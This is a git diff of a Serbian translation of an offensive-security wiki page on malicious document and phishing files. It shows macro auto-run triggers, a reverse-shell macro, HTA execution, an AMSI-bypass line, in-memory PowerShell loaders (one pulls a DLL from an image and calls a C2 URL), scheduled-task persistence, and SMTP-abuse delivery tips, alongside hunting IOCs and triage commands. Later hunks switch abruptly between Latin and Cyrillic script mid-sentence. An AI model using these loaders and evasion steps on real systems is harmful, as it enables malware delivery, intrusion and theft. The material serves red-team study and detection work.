@@ -4,26 +4,26 @@
 
 ## Office dokumenti
 
-Microsoft Word proverava ispravnost podataka u fajlu pre nego što ga otvori. Provera se obavlja identifikacijom strukture podataka prema standardu OfficeOpenXML. Ako tokom identifikacije strukture podataka dođe do greške, analizirani fajl neće biti otvoren.
+Microsoft Word proverava validnost podataka u fajlu pre nego što ga otvori. Provera validnosti podataka obavlja se identifikacijom strukture podataka, u skladu sa standardom OfficeOpenXML. Ako tokom identifikacije strukture podataka dođe do greške, analizirani fajl neće biti otvoren.
 
-Word fajlovi koji sadrže makroe obično koriste ekstenziju `.docm`. Međutim, moguće je promeniti ekstenziju fajla i pritom zadržati mogućnost izvršavanja makroa.\
-Na primer, RTF fajl po dizajnu ne podržava makroe, ali će Microsoft Word obraditi DOCM fajl kojem je promenjena ekstenzija u RTF i moći će da izvršava makroe.\
+Word fajlovi koji sadrže makroe obično koriste ekstenziju `.docm`. Međutim, moguće je preimenovati fajl promenom ekstenzije, a da i dalje zadrži mogućnost izvršavanja makroa.\
+Na primer, RTF fajl po dizajnu ne podržava makroe, ali Microsoft Word će obraditi DOCM fajl preimenovan u RTF i omogućiće izvršavanje makroa.\
 Isti interni mehanizmi važe za sav softver iz paketa Microsoft Office (Excel, PowerPoint itd.).
 
-Možete koristiti sledeću komandu da proverite koje ekstenzije će izvršavati neki Office programi:
+Možete koristiti sledeću komandu da proverite koje će ekstenzije izvršavati neki Office programi:
 
 ```bash
 assoc | findstr /i "word excel powerp"
 ```
 
-DOCX datoteke koje upućuju na udaljeni predložak (Datoteka – Opcije – Programski dodaci – Upravljanje: Predlošci – Idi) koji sadrži makroe mogu i da „izvršavaju“ makroe.
+DOCX fajlovi koji upućuju na udaljeni template (File –Options –Add-ins –Manage: Templates –Go) koji sadrži makroe mogu takođe da „izvrše“ makroe.
 
 ### Učitavanje spoljne slike
 
-Idite na: _Umetanje --> Brzi delovi --> Polje_\
-_**Kategorije**: Veze i reference, **Nazivi polja**: includePicture i **Naziv datoteke ili URL**:_ http://<ip>/whatever
+Idite na: _Insert --> Quick Parts --> Field_\
+_**Kategorije**: Veze i reference, **Nazivi polja**: includePicture, i **Naziv fajla ili URL**:_ http://<ip>/whatever
 
-![Office Documents - Učitavanje spoljne slike: Idite na: Umetanje -- Brzi delovi -- Polje](<../../images/image (155).png>)
+![Office Documents - Učitavanje spoljne slike: Idite na: Insert -- Quick Parts -- Field](<../../images/image (155).png>)
 
 ### Macros Backdoor
 
@@ -31,7 +31,7 @@ Makroi se mogu koristiti za pokretanje proizvoljnog koda iz dokumenta.
 
 #### Funkcije za automatsko učitavanje
 
-Što se češće koriste, veća je verovatnoća da će ih AV otkriti.
+Što su one češće, veća je verovatnoća da će ih AV otkriti.
 
 - AutoOpen()
 - Document_Open()
@@ -70,12 +70,12 @@ proc.Create "powershell <beacon line generated>
 
 #### Ručno uklanjanje metapodataka
 
-Idite na **Datoteka > Informacije > Proveri dokument > Proveri dokument** da biste otvorili Document Inspector. Kliknite na **Proveri**, a zatim na **Ukloni sve** pored stavke **Svojstva dokumenta i lični podaci**.
+Idite na **File > Info > Inspect Document > Inspect Document** da biste otvorili Document Inspector. Kliknite na **Inspect**, a zatim na **Remove All** pored stavke **Document Properties and Personal Information**.
 
-#### Ekstenzija dokumenta
+#### Doc ekstenzija
 
-Kada završite, izaberite padajući meni **Sačuvaj kao tip** i promenite format iz **`.docx`** u Word 97-2003 **`.doc`**.\
-Uradite to zato što **ne možete da sačuvate makroe unutar datoteke `.docx`**, a ekstenzija **`.docm`** koja podržava makroe ima **lošu reputaciju** (npr. ikonica sličice ima ogromno `!`, a neki web/email gateway-i ih potpuno blokiraju). Zato je ova **zastarela ekstenzija `.doc` najbolji kompromis**.
+Kada završite, izaberite padajući meni **Save as type** i promenite format iz **`.docx`** u Word 97-2003 **`.doc`**.\
+Uradite to zato što **ne možete da sačuvate makroe unutar datoteke `.docx`**, a oko ekstenzije **`.docm`** koja podržava makroe postoji **stigma** (npr. ikonica sličice ima veliko `!`, a neki web/email gateway sistemi ih potpuno blokiraju). Zato je ova **zastarela ekstenzija `.doc` najbolji kompromis**.
 
 #### Generatori zlonamernih makroa
 
@@ -83,9 +83,9 @@ Uradite to zato što **ne možete da sačuvate makroe unutar datoteke `.docx`**,
   - [**macphish**](https://github.com/cldrn/macphish)
   - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)
 
-## LibreOffice ODT makroi za automatsko pokretanje (Basic)
+## LibreOffice ODT makroi sa automatskim pokretanjem (Basic)
 
-LibreOffice Writer dokumenti mogu da sadrže Basic makroe i da ih automatski izvrše kada se datoteka otvori, tako što se makro poveže sa događajem **Otvori dokument** (Alati → Prilagodi → Događaji → Otvori dokument → Makro…).<sup>[[1]](#references)</sup> Jednostavan makro za reverse shell izgleda ovako:
+LibreOffice Writer dokumenti mogu da sadrže Basic makroe i da ih automatski izvrše kada se datoteka otvori, tako što se makro poveže sa događajem **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Jednostavan makro za reverse shell izgleda ovako:
 
 ```vb
 Sub Shell
@@ -93,18 +93,18 @@ Sub Shell
 End Sub
 ```
 
-Obratite pažnju na dvostruke navodnike (`""`) unutar stringa – LibreOffice Basic ih koristi za escape-ovanje doslovnih navodnika, pa payload-i koji se završavaju sa `...==""")` imaju pravilno uparene navodnike i u unutrašnjoj komandi i u argumentu za Shell.
+Obratite pažnju na udvojene navodnike (`""`) unutar stringa – LibreOffice Basic ih koristi za escapeovanje doslovnih navodnika, tako da payloadovi koji se završavaju sa `...==""")` imaju uravnotežene i unutrašnju komandu i Shell argument.
 
 Saveti za isporuku:
 
 - Sačuvajte kao `.odt` i povežite macro sa događajem dokumenta kako bi se odmah pokrenuo pri otvaranju.
-- Kada šaljete e-poštu pomoću `swaks`, koristite `--attach @resume.odt` (znak `@` je obavezan kako bi se kao prilog poslali bajtovi fajla, a ne string sa nazivom fajla). Ovo je ključno kada se zloupotrebljavaju SMTP serveri koji prihvataju proizvoljne primaoce `RCPT TO` bez validacije.
+- Kada šaljete e-poštu pomoću `swaks`, koristite `--attach @resume.odt` (`@` je neophodan kako bi se sadržaj fajla, a ne tekst naziva fajla, poslao kao prilog). Ovo je ključno kada se zloupotrebljavaju SMTP serveri koji prihvataju proizvoljne `RCPT TO` primaoce bez provere.
 
 ## HTA fajlovi
 
-HTA je Windows program koji **kombinuje HTML i skriptne jezike (kao što su VBScript i JScript)**. Generiše korisnički interfejs i izvršava se kao aplikacija sa „punim poverenjem“, bez ograničenja bezbednosnog modela pregledača.
+HTA je Windows program koji **objedinjuje HTML i skriptne jezike (kao što su VBScript i JScript)**. Generiše korisnički interfejs i izvršava se kao „potpuno pouzdana“ aplikacija, bez ograničenja bezbednosnog modela pregledača.
 
-HTA se izvršava pomoću **`mshta.exe`**, koji se obično **instalira** zajedno sa **Internet Explorer-om**, što znači da `mshta` zavisi od IE-a. Ako je IE deinstaliran, HTA fajlovi neće moći da se izvrše.
+HTA se izvršava pomoću **`mshta.exe`**, koji se obično **instalira** zajedno sa **Internet Explorerom**, zbog čega **`mshta` zavisi od IE-a**. Ako je IE deinstaliran, HTA fajlovi neće moći da se izvršavaju.
 
 ```html
 <--! Basic HTA Execution -->
@@ -161,11 +161,11 @@ HTA se izvršava pomoću **`mshta.exe`**, koji se obično **instalira** zajedno 
 </script>
 ```
 
-## Prisiljavanje NTLM autentikacije
+## Prisiljavanje NTLM autentifikacije
 
-Postoji nekoliko načina da se **udaljeno prisili NTLM autentikacija**. Na primer, možete da dodate **nevidljive slike** u imejlove ili HTML sadržaj komе će korisnik pristupiti (čak i HTTP MitM?). Možete i da pošaljete žrtvi **putanju do fajlova** koji će **pokrenuti** **autentikaciju** čim **otvori fasciklu**.
+Postoji nekoliko načina da **„daljinski“ primorate NTLM autentifikaciju**. Na primer, možete da dodate **nevidljive slike** u imejlove ili HTML stranice kojima će korisnik pristupiti (čak i HTTP MitM?). Ili pošaljite žrtvi **putanju do datoteka** koje će **pokrenuti** **autentifikaciju** čim **otvori fasciklu**.
 
-**Pogledajte ove ideje i još neke na sledećim stranicama:**
+**Proverite ove i druge ideje na sledećim stranicama:**
 
 
 {{#ref}}
@@ -179,24 +179,24 @@ Postoji nekoliko načina da se **udaljeno prisili NTLM autentikacija**. Na prime
 
 ### NTLM Relay
 
-Ne zaboravite da možete ne samo da ukradete hash ili podatke za autentikaciju već i da **izvedete NTLM relay napade**:
+Ne zaboravite da možete ne samo da ukradete hash ili podatke za autentifikaciju već i da **izvedete NTLM relay napade**:
 
 - [**NTLM Relay napadi**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
-- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
+- [**AD CS ESC8 (NTLM relay do sertifikata)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
 
-## LNK Loaders + Payloads ugrađeni u ZIP (fileless lanac)
+## LNK učitavači + payload-i ugrađeni u ZIP (fileless lanac)
 
-Veoma efikasne kampanje isporučuju ZIP koji sadrži dva legitimna dokumenta-mamca (PDF/DOCX) i zlonamerni .lnk fajl. Trik je u tome što je stvarni PowerShell loader smešten u sirovim bajtovima ZIP fajla, iza jedinstvene oznake, a .lnk ga izdvaja i pokreće u celosti u memoriji.<sup>[[2]](#references)</sup>
+Veoma efikasne kampanje isporučuju ZIP koji sadrži dva legitimna dokumenta za odvraćanje pažnje (PDF/DOCX) i zlonamerni .lnk. Trik je u tome što je stvarni PowerShell loader smešten u sirovim bajtovima ZIP-a, iza jedinstvene oznake, a .lnk ga izdvaja i pokreće u potpunosti u memoriji.<sup>[[2]](#references)</sup>
 
-Tipičan tok koji implementira PowerShell one-liner u .lnk fajlu:
+Tipičan tok koji implementira PowerShell jednolinijska komanda u .lnk datoteci:
 
-1) Pronađe originalni ZIP na uobičajenim lokacijama: Desktop, Downloads, Documents, %TEMP%, %ProgramData% i u nadređenoj fascikli trenutnog radnog direktorijuma.
-2) Pročita bajtove ZIP fajla i pronađe hardkodiranu oznaku (npr. xFIQCV). Sve nakon oznake predstavlja ugrađeni PowerShell payload.
-3) Kopira ZIP u %ProgramData%, raspakuje ga tamo i otvara .docx mamac kako bi delovao legitimno.
-4) Zaobilazi AMSI za trenutni proces: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
-5) Dekodira sledeću fazu (npr. uklanja sve znakove #) i izvršava je u memoriji.
+1) Pronađite originalni ZIP na uobičajenim lokacijama: Desktop, Downloads, Documents, %TEMP%, %ProgramData% i nadređenom direktorijumu trenutnog radnog direktorijuma.
+2) Pročitajte bajtove ZIP-a i pronađite hardkodiranu oznaku (npr. xFIQCV). Sve što sledi nakon oznake predstavlja ugrađeni PowerShell payload.
+3) Kopirajte ZIP u %ProgramData%, raspakujte ga tamo i otvorite lažni .docx da bi delovao legitimno.
+4) Zaobiđite AMSI za trenutni proces: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
+5) Dekodirajte sledeću fazu (npr. uklonite sve znakove #) i izvršite je u memoriji.
 
-Primer PowerShell kostura za izdvajanje ugrađene faze i njeno pokretanje:
+Primer PowerShell kostura za izdvajanje i pokretanje ugrađene faze:
 
 ```powershell
 $marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
@@ -216,34 +216,34 @@ Invoke-Expression $code
 ```
 
 Beleške
-- Isporuka često zloupotrebljava poddomene renomiranih PaaS-ova (npr., *.herokuapp.com) i može da ograniči isporuku payload-a (da isporučuje bezopasne ZIP-ove na osnovu IP/UA).
-- Sledeća faza često dešifruje base64/XOR shellcode i izvršava ga pomoću Reflection.Emit + VirtualAlloc kako bi svela na minimum tragove na disku.
+- Isporuka često zloupotrebljava poddomene renomiranih PaaS platformi (npr. *.herokuapp.com) i može ograničiti pristup payload-ima (isporučivati bezazlene ZIP-ove na osnovu IP/UA).
+- Sledeća faza često dešifruje base64/XOR shellcode i izvršava ga putem Reflection.Emit + VirtualAlloc kako bi smanjila broj artefakata na disku.
 
 Persistence korišćen u istom lancu
-- COM TypeLib hijacking kontrole Microsoft Web Browser, tako da IE/Explorer ili bilo koja aplikacija koja je ugrađuje automatski ponovo pokreće payload.<sup>[[2]](#references)[[4]](#references)</sup> Detalje i komande spremne za upotrebu pogledajte ovde:
+- COM TypeLib hijacking Microsoft Web Browser kontrole, tako da IE/Explorer ili bilo koja aplikacija koja je ugrađuje automatski ponovo pokrene payload.<sup>[[2]](#references)[[4]](#references)</sup> Detalje i komande spremne za upotrebu pogledajte ovde:
 
 {{#ref}}
 ../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
 {{#endref}}
 
-Potraga/IOC-ovi
-- ZIP datoteke koje sadrže ASCII marker string (npr., xFIQCV) dodat na kraj podataka arhive.
-- .lnk koji pretražuje roditeljske/korisničke fascikle da bi pronašao ZIP i otvorio dokument za odvraćanje pažnje.
-- AMSI tampering pomoću [System.Management.Automation.AmsiUtils]::amsiInitFailed.
-- Duge poslovne prepiske koje se završavaju linkovima hostovanim na pouzdanim PaaS domenima.
+Hunting/IOCs
+- ZIP datoteke koje sadrže ASCII marker string (npr. xFIQCV) dodat na podatke arhive.
+- .lnk koji pretražuje nadređene/korisničke fascikle da bi pronašao ZIP i otvorio dokument-mamac.
+- AMSI tampering putem [System.Management.Automation.AmsiUtils]::amsiInitFailed.
+- Duge poslovne prepiske koje završavaju linkovima hostovanim na trusted PaaS domenima.
 
-## Prvo otvaranje dokumenta za odvraćanje pažnje putem LNK → persistence putem scheduled task-a → trusted CPL side-loading
+## LNK staging sa mamcem na prvom mestu → persistence putem scheduled task-a → trusted CPL side-loading
 
-Još jedan obrazac koji se često ponavlja jeste **`.lnk` koji se predstavlja kao dokument** i odmah otvara bezopasan mamac, dok u pozadini priprema stvarni lanac.<sup>[[3]](#references)</sup>
+Još jedan ponavljajući obrazac je **`.lnk` koji se predstavlja kao dokument**, a odmah otvara bezazlen mamac dok u pozadini priprema pravi lanac.<sup>[[3]](#references)</sup>
 
 Uočeni tok rada:
-1. Prečica **se predstavlja kao PDF** i koristi `conhost.exe` ili sličan proxy da pokrene obfuscate-ovan PowerShell downloader.
-2. PowerShell razdvaja očigledne tokene (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) tako da naivne detekcije koje traže `iwr`, `gci`, `ren`, `cpi` ili `schtasks` ne prepoznaju komandu.
-3. Stager prvo preuzima **dokument za odvraćanje pažnje**, otvara ga za žrtvu, a zatim u pozadini rekonstruiše zlonamerne datoteke.
-4. Payload-i mogu biti zapisani sa **lažnim ekstenzijama**, a zatim preimenovani uklanjanjem dodatnih znakova, čime se odlaže pojava očiglednih `.exe` / `.cpl` artefakata.
-5. Persistence se uspostavlja pomoću **scheduled task-a koji se pokreće svakog minuta** i pokreće pouzdani host binary sa putanje na koju korisnik može da upisuje.
+1. Prečica **se predstavlja kao PDF** i koristi `conhost.exe` ili sličan proxy za pokretanje obfuskovanog PowerShell downloader-a.
+2. PowerShell deli očigledne tokene (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), tako da jednostavne detekcije koje traže `iwr`, `gci`, `ren`, `cpi` ili `schtasks` ne prepoznaju komandu.
+3. Stager prvo preuzima **dokument-mamac**, otvara ga za žrtvu, a zatim u pozadini rekonstruiše zlonamerne datoteke.
+4. Payload-i mogu biti upisani sa **bezvrednim ekstenzijama**, a zatim preimenovani uklanjanjem suvišnih znakova, čime se odlaže pojava očiglednih `.exe` / `.cpl` artefakata.
+5. Persistence se uspostavlja pomoću **scheduled task-a koji se pokreće svakog minuta**, a koji pokreće trusted host binary sa putanje na koju korisnik može da upisuje.
 
-Minimalni tragovi za potragu na osnovu ovog obrasca:
+Osnovni tragovi za hunting u ovom obrascu:
 
 ```powershell
 # Suspicious split-token PowerShell seen in LNK chains
@@ -252,25 +252,25 @@ r''e''n
 &(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
 ```
 
-Korisno je prepoznati sledeći raspored stage-ova:
+Koristan raspored za prepoznavanje:
 - `C:\Users\Public\<decoy>.pdf`
 - `C:\Users\Public\<trusted>.exe`
 - `C:\Users\Public\<malicious>.cpl` ili `.dll`
 - `C:\Windows\Tasks\<blob>.dat`
 
-### Zašto je drugi stage prikriven
+### Zašto je druga faza prikrivena
 
-U studiji slučaja Rapid7, zakazani zadatak je više puta pokretao **`Fondue.exe`** iz direktorijuma `C:\Users\Public\`. Pošto je **`APPWIZ.cpl`** bio postavljen pored njega i izvozio **`RunFODW`**, pouzdani Microsoft-ov binarni fajl učitavao je attackerov CPL umesto legitimne sistemske kopije.
+U studiji slučaja Rapid7, zakazani zadatak je više puta pokretao **`Fondue.exe`** iz direktorijuma `C:\Users\Public\`. Pošto je **`APPWIZ.cpl`** bio postavljen pored njega i izvozio funkciju **`RunFODW`**, pouzdani Microsoftov binarni fajl učitavao je CPL napadača umesto legitimne sistemske kopije.
 
 CPL zatim:
-- Čita **AES-256-CBC** blob iz `C:\Windows\Tasks\editor.dat`
+- Čita blob **AES-256-CBC** iz `C:\Windows\Tasks\editor.dat`
 - Dešifruje ga pomoću **Windows CNG / `bcrypt.dll`**
-- Alocira izvršivu memoriju i kopira dešifrovani shellcode u nju
-- Indirektno ga izvršava tako što prosleđuje pokazivač na shellcode kao callback za **`EnumUILanguagesW`**
+- Alocira izvršivu memoriju i kopira dešifrovani shellcode
+- Pokreće ga posredno tako što pokazivač na shellcode prosleđuje kao callback funkciji **`EnumUILanguagesW`**
 
-Vredi zasebno tražiti taj poslednji korak: malware često izbegava direktan skok `((void(*)())buf)()` i umesto toga zloupotrebljava **legitimni WinAPI koji prima callback** za prenos izvršavanja.
+Taj poslednji korak vredi posebno istražiti: malware često izbegava direktan skok `((void(*)())buf)()` i umesto toga злоупотребљава **legitimni WinAPI koji prihvata callback** za prenos izvršavanja.
 
-Dešifrovani payload u ovoj kampanji bio je **Donut** shellcode, koji je zatim u potpunosti mapirao konačni PE u memoriju i zakrpio **AMSI/WLDP/ETW** u trenutnom procesu pre nego što je predao izvršavanje. Za detaljnije beleške o side-loading-u i post-procesiranju rezidentnom u memoriji, pogledajte:
+Dešifrovani payload u овој кампањи био је shellcode **Donut**, који је затим у потпуности мапирао завршни PE у меморију и закрпио **AMSI/WLDP/ETW** у тренутном процесу пре него што је предао извршавање. За детаљније белешке о side-loading-у и накнадној обради у меморији погледајте:
 
 {{#ref}}
 ../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
@@ -280,30 +280,30 @@ Dešifrovani payload u ovoj kampanji bio je **Donut** shellcode, koji je zatim u
 ../../windows-hardening/av-bypass.md
 {{#endref}}
 
-Praktični pivot-i za lov:
-- `.lnk` pokreće `powershell.exe` ili `conhost.exe`, a zatim se prikazuje decoy dokument.
-- Kratkotrajna preuzimanja u **`C:\Users\Public\`**, praćena trenutnim preimenovanjima fajlova sa nasumičnim ekstenzijama.
-- Zakazani zadaci sa bezazlenim imenima, kao što je `GoogleErrorReport`, koji se izvršavaju iz **direktorijuma u koje korisnik može da upisuje**.
-- Pouzdani binarni fajlovi učitavaju **`.cpl` / `.dll`** fajlove iz istog direktorijuma koji nije sistemski.
-- Base64 tekstualni blob-ovi upisani u **`C:\Windows\Tasks\`**, koje zatim čita side-loaded modul.
+Практичне смернице за претрагу:
+- `.lnk` покреће `powershell.exe` или `conhost.exe`, након чега следи видљиви документ-мамац.
+- Краткотрајна преузимања у **`C:\Users\Public\`**, након којих одмах следе преименовања из бесмислених екстензија.
+- Заказани задаци са неупадљивим именима, попут `GoogleErrorReport`, који се извршавају из **директоријума у које корисник може да уписује**.
+- Поуздани бинарни фајлови учитавају **`.cpl` / `.dll`** датотеке из истог директоријума који није системски.
+- Base64 текстуални blob-ови уписани у **`C:\Windows\Tasks\`**, а затим прочитани помоћу модула учитаног side-loading-ом.
 
-## Payload-i omeđeni steganografskim markerima u slikama (PowerShell stager)
+## Payload-ови у сликама, разграничени steganography маркерима (PowerShell stager)
 
-Noviji lanci loader-a isporučuju zamaskirani JavaScript/VBS koji dekodira i pokreće Base64 PowerShell stager. Taj stager preuzima sliku (često GIF) koja sadrži Base64-kodirani .NET DLL sakriven kao običan tekst između jedinstvenih početnih i završnih markera. Skripta traži ove delimitere (primeri zabeleženi u praksi: «<<sudo_png>> … <<sudo_odt>>>»), izdvaja tekst između njih, Base64-dekodira ga u bajtove, učitava assembly u memoriju i poziva poznati entry metod uz C2 URL.<sup>[[5]](#references)</sup>
+Недавни ланци за учитавање испоручују замагљени JavaScript/VBS који декодира и покреће Base64 PowerShell stager. Тај stager преузима слику (често GIF) која садржи Base64-енкодирану .NET DLL сакривену као обичан текст између јединствених почетних и завршних маркера. Скрипта тражи ове граничнике (примери уочени у стварним нападима: «<<sudo_png>> … <<sudo_odt>>>»), издваја текст између њих, Base64-декодира га у бајтове, учитава склоп у меморију и позива познату улазну методу са C2 URL-ом.<sup>[[5]](#references)</sup>
 
-Tok rada
-- Stage 1: JS/VBS dropper u arhivi → dekodira ugrađeni Base64 → pokreće PowerShell stager sa -nop -w hidden -ep bypass.
-- Stage 2: PowerShell stager → preuzima sliku, izdvaja Base64 omeđen markerima, učitava .NET DLL u memoriju i poziva njegov metod (npr. VAI), prosleđujući C2 URL i opcije.
-- Stage 3: Loader preuzima konačni payload i obično ga ubacuje pomoću process hollowing-a u pouzdani binarni fajl (najčešće MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Više o process hollowing-u i proxy izvršavanju preko pouzdanih alata pročitajte ovde:
+Ток рада
+- Фаза 1: Архивирани JS/VBS dropper → декодира уграђени Base64 → покреће PowerShell stager са -nop -w hidden -ep bypass.
+- Фаза 2: PowerShell stager → преузима слику, издваја Base64 између маркера, учитава .NET DLL у меморију и позива њену методу (нпр. VAI), прослеђујући C2 URL и опције.
+- Фаза 3: Loader преузима завршни payload и обично га убацује помоћу process hollowing-а у поуздани бинарни фајл (најчешће MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Више о process hollowing-у и извршавању преко поузданих услужних програма погледајте овде:
 
 {{#ref}}
 ../../reversing/common-api-used-in-malware.md
 {{#endref}}
 
-PowerShell primer za izdvajanje DLL-a iz slike i pozivanje .NET metoda u memoriji:
+PowerShell пример за издвајање DLL-а из слике и позивање .NET методе у меморији:
 
 <details>
-<summary>PowerShell izdvajač stego payload-a i loader</summary>
+<summary>PowerShell издвајач stego payload-а и loader</summary>
 
 ```powershell
 # Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
@@ -331,10 +331,10 @@ $null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
 
 Napomene
 - Ovo je ATT&CK T1027.003 (steganografija/sakrivanje markera).<sup>[[6]](#references)</sup> Markeri se razlikuju među kampanjama.
-- AMSI/ETW bypass i deobfuskacija stringova se često primenjuju pre učitavanja assembly-ja.
-- Lov: skenirajte preuzete slike u potrazi za poznatim delimiterima; identifikujte PowerShell procese koji pristupaju slikama i odmah dekodiraju Base64 blobove.
+- AMSI/ETW bypass i deobfuskacija stringova se obično primenjuju pre učitavanja assembly-ja.
+- Lov: skenirajte preuzete slike u potrazi za poznatim delimiterima; identifikujte PowerShell koji pristupa slikama i odmah dekodira Base64 blobove.
 
-Pogledajte i stego alate i tehnike izdvajanja:
+Pogledajte i stego alate i tehnike izdvajanja podataka:
 
 {{#ref}}
 ../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
@@ -342,23 +342,23 @@ Pogledajte i stego alate i tehnike izdvajanja:
 
 ## JS/VBS droppers → Base64 PowerShell staging
 
-Česta početna faza je mali, snažno obfuskiran `.js` ili `.vbs` fajl isporučen unutar arhive. Njegova jedina svrha je da dekodira ugrađeni Base64 string i pokrene PowerShell sa `-nop -w hidden -ep bypass` kako bi pokrenuo sledeću fazu preko HTTPS-a.<sup>[[5]](#references)</sup>
+Česta početna faza je mali, snažno obfuskiran `.js` ili `.vbs` fajl isporučen unutar arhive. Njegova jedina svrha je da dekodira ugrađeni Base64 string i pokrene PowerShell sa opcijama `-nop -w hidden -ep bypass` kako bi pripremio sledeću fazu preko HTTPS-a.<sup>[[5]](#references)</sup>
 
 Osnovna logika (apstraktno):
 - Pročitajte sadržaj sopstvenog fajla
-- Pronađite Base64 blob između nasumičnih stringova
+- Pronađite Base64 blob između besmislenih stringova
 - Dekodirajte u ASCII PowerShell
-- Izvršite pomoću `wscript.exe`/`cscript.exe`, pozivajući `powershell.exe`
+- Izvršite pomoću `wscript.exe`/`cscript.exe` koji pokreće `powershell.exe`
 
-Indikatori za lov
+Signali za lov
 - Arhivirani JS/VBS prilozi koji pokreću `powershell.exe` sa `-enc`/`FromBase64String` u komandnoj liniji.
-- `wscript.exe` pokreće `powershell.exe -nop -w hidden` iz korisničkih privremenih putanja.
+- `wscript.exe` pokreće `powershell.exe -nop -w hidden` iz privremenih putanja korisnika.
 
 ## MSC dokumenti kao kontejneri za izvršavanje (GrimResource)
 
-Microsoft Management Console fajlovi (`.msc`) su XML definicije konzole koje se obično otvaraju pomoću `mmc.exe`. **GrimResource** zloupotrebljava referencu `StringTable` ka resursu `apds.dll` koji sadrži stari XSS primitive, tako da otvaranje posebno napravljenе konzole od strane korisnika dovodi do pokretanja JavaScript-a unutar `mmc.exe`. Uočeni primerci kombinovali su obfuskaciju zasnovanu na `transformNode` sa **DotNetToJScript** kako bi instancirali .NET payload bez uobičajenog puta preko Office makroa.<sup>[[9]](#references)</sup>
+Microsoft Management Console fajlovi (`.msc`) su XML definicije konzola koje se obično otvaraju pomoću `mmc.exe`. **GrimResource** koristi referencu `StringTable` ka resursu `apds.dll` koji sadrži stari XSS primitive, tako da otvaranje posebno napravljenе konzole dovodi do izvršavanja JavaScript-a unutar `mmc.exe`. Uočeni primerci kombinovali su obfuskaciju zasnovanu na `transformNode` sa **DotNetToJScript** kako bi instancirali .NET payload bez uobičajenog puta kroz Office macro.<sup>[[9]](#references)</sup>
 
-Za statičku trijažu, tretirajte nepouzdan MSC kao tekst i **nemojte ga otvarati dvostrukim klikom**:<sup>[[9]](#references)</sup>
+Za statičku trijažu, tretirajte MSC fajl iz nepouzdanog izvora kao tekst i **nemojte** ga otvarati dvostrukim klikom:<sup>[[9]](#references)</sup>
 
 ```bash
 file lure.msc
@@ -367,13 +367,13 @@ grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64S
 strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
 ```
 
-Pokazatelji izvršavanja sa visokim signalom su kada `mmc.exe` učitava CLR ili skriptne komponente, uspostavlja mrežne veze ili pokreće `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` ili neočekivanu izvršnu datoteku. Format je legitiman, zato detekcije treba da povezuju **poreklo + sumnjiv XML/skriptni sadržaj + ponašanje `mmc.exe`**, umesto da blokiraju sve MSC datoteke.<sup>[[9]](#references)</sup>
+Indikatori tokom izvršavanja sa visokim signalom uključuju učitavanje CLR-a ili skriptnih komponenti od strane `mmc.exe`, uspostavljanje mrežnih veza ili pokretanje procesa `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` ili neočekivane izvršne datoteke. Format je legitiman, pa detekcije treba da povezuju **poreklo + sumnjiv XML/skriptni sadržaj + ponašanje `mmc.exe`**, umesto da blokiraju svaki MSC.<sup>[[9]](#references)</sup>
 
-## PDF/QR preusmerivači i payload gating
+## PDF/QR preusmerivači i uslovljavanje isporuke payload-a
 
-PDF ne mora da sadrži exploit da bi bio koristan. U nedavnim kampanjama, u dokumente koji deluju bezazleno postavljaju se **QR kod ili običan link**, zatim se sesija pregledača preusmerava van kontrola za e-poštu, a odredište se prilagođava adresi primaoca. Microsoft je dokumentovao PDF-ove iz 2025. čiji su QR URL-ovi bili jedinstveni za svakog primaoca i vodili do infrastrukture za krađu akreditiva RaccoonO365; u paralelnom lancu koristilo se ograničavanje prema IP-u/okruženju, tako da su odabranim posetiocima prikazivali JavaScript/MSI putanju, a skenerima ili nedozvoljenim klijentima bezazlen PDF.<sup>[[10]](#references)</sup>
+PDF ne mora da sadrži exploit da bi bio koristan. U nedavnim kampanjama u dokumentima koji deluju bezazleno postavljaju se **QR code ili običan link**, sesija pregledača se preusmerava izvan kontrola e-pošte, a odredište se prilagođava adresi primaoca. Microsoft je dokumentovao PDF-ove iz 2025. čiji su QR URL-ovi bili jedinstveni za svakog primaoca i vodili do infrastrukture za krađu akreditiva RaccoonO365; u paralelnom lancu korišćeno je uslovljavanje prema IP-u/okruženju da bi se odabranim posetiocima isporučila JavaScript/MSI putanja, a skenerima ili nedozvoljenim klijentima bezazlen PDF.<sup>[[10]](#references)</sup>
 
-U trijaži proverite i radnje PDF-a i renderovane QR kodove. QR kod može biti nacrtan kao vektorska grafika, a ne sačuvan kao slika koju je moguće izdvojiti, zato rasterizujte svaku stranicu i izdvojite ugrađene slike:
+Tokom trijaže proverite i PDF radnje i prikazane QR kodove. QR može biti nacrtan kao vektor, umesto da bude sačuvan kao slika koja se može izdvojiti, pa rasterizujte svaku stranicu i izdvojte ugrađene slike:
 
 ```bash
 pdfid.py lure.pdf
@@ -385,9 +385,9 @@ pdftoppm -png -r 300 lure.pdf page
 zbarimg --quiet image-*.png page-*.png
 ```
 
